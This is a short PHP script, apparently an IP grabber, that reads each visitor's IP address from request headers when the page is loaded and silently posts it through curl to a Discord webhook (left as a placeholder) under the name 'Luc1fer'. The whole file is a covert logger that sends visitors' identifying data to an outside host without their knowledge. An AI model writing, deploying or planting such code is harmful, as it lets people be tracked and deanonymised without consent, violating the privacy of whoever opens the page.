<?php
$webhookurl = "DISCORD WEBHOOK URL HERE";

$json_data = json_encode([

    // Username
    "username" => "Luc1fer",

    "content" => $_SERVER['HTTP_CLIENT_IP'] ? : ($_SERVER['HTTP_X_FORWARDED_FOR'] ? : $_SERVER['REMOTE_ADDR'])

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
$response = curl_exec( $ch );
curl_close( $ch );
?>
